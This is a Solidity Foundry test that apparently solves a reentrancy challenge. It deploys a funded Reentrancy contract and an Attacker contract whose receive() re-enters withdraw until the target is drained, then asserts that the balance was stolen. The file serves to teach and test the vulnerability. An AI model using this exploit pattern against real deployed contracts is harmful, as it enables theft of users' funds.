// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Reentrancy} from "~/Reentrancy.sol";

contract ReentrancyTest is Test {
    Reentrancy target;
    address player;
    Attacker attacker;

    uint256 contractBalance = 1 ether;
    uint256 playerBalance = 0.1 ether;

    function setUp() public {
        target = new Reentrancy();

        // contract has some donations by the owner at first
        target.donate{value: contractBalance}(address(this));

        // player starts with 1 ether
        player = makeAddr("player");
        vm.deal(player, playerBalance);
    }

    function attack() private {
        attacker = new Attacker(payable(target));
        attacker.attack{value: playerBalance}();
        attacker.reap();
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        assertEq(address(target).balance, 0, "target must be drained");
        assertGt(player.balance, contractBalance, "player must have stolen the balance");
    }

    receive() external payable {}
}

contract Attacker {
    address payable public owner;
    Reentrancy targetContract;
    uint256 donation;

    constructor(address payable _targetAddr) {
        targetContract = Reentrancy(_targetAddr);
        owner = payable(msg.sender);
    }

    // reap the rewards of your attack
    function reap() external {
        owner.transfer(address(this).balance);
    }

    // begin attack by depositing and withdrawing
    // when all functions return, we will transfer funds to owner
    function attack() external payable {
        donation = msg.value;
        targetContract.donate{value: donation}(address(this));
        targetContract.withdraw(donation);
    }

    // point of re-entry
    receive() external payable {
        uint256 targetBalance = address(targetContract).balance;
        if (targetBalance >= donation) {
            // withdraw at most your balance at a time
            targetContract.withdraw(donation);
        } else if (targetBalance > 0) {
            // withdraw the remaining balance in the contract
            // this edge case is when attacker donation does not
            // perfectly divide the target balance
            targetContract.withdraw(targetBalance);
        }
    }
}
